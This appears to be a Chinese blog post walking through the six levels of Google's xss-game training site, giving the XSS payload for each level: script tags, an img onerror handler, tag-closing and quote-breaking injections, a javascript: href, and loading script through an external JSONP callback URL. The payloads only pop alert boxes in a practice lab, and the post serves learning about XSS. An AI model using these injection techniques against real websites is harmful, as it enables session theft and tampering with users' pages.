---
title: 一个模拟 XSS 攻击的小游戏
tags:
  - XSS
  - HTTP
categories:
  - HTTP
date: 2017-09-24 16:52:28
---
# 一个模拟 XSS 攻击的小游戏

>游戏地址 xss-game : https://xss-game.appspot.com/

>由简到难一共六关，覆盖了绝大多数的 XSS 攻击方法，挺有意思的，玩游戏的同时帮助你学习了解 XSS 攻击原理

### 1. 直接写 `script` 标签

```
<script>alert("xss")<script>
```

### 2. 图片加载失败触发 `onerror` 方法

```
// XSS 注入
<img src = "asd" onerror="alert(1)" >
```

### 3. 强行闭合标签
```
// 在地址栏会显示图片锚点（用拼接 html 方式组合图片）
<img src='123.jpg'>
// http://xxx.xxx.xxx#123

// XSS 强行闭合标签
'><script>alert(1)</script>
```

### 4. 找到页面中 `submit` 方法触发 `onload` 方法的地方

```javascript
// submit 3
onload="startTimer('3');"

// xss 强行闭合
3');alert('1
```

### 5. 寻找 `a` 标签跳转 观察地址栏 串改 href 触发 javascript

```
// normal
// https://xss-game.appspot.com/level5/frame/signup?next=confirm
<a href = "confirm" >

// xss
// 修改 ==> https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1) ==> 转到
// 然后 a 标签自动串改
<a href = "javascript:alert(1)" >
```

### 6. 修改 query 参数

- 查看 query string 参数 
- 分析 html 中的 javascript 代码 
- 自己做一个 js xss 攻击文件，放在自己服务器
-  替换 query 参数指向自己的攻击文件

```javascript
// https://xss-game.appspot.com/level6/frame#/static/gadget.js
// 下面是当前页面中的某条源码
if (url.match(/^https?:\/\//)) {

// xss
// 查看提示 google 提供一个 api 
// google.com/jsapi?callback=foo
// 拉到最后发现执行了一个 foo() 
// 替换成 xss 攻击函数
// google.com/jsapi?callback=alert("xss")
// 替换原始 url 
// https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert("xss")
```

### 最后是通关奖励

![@通关奖励 - 一张破图 | center | 0 ](https://ws1.sinaimg.cn/large/889b2f7fgy1fjuqr9gmubj21hc0qd77d.jpg)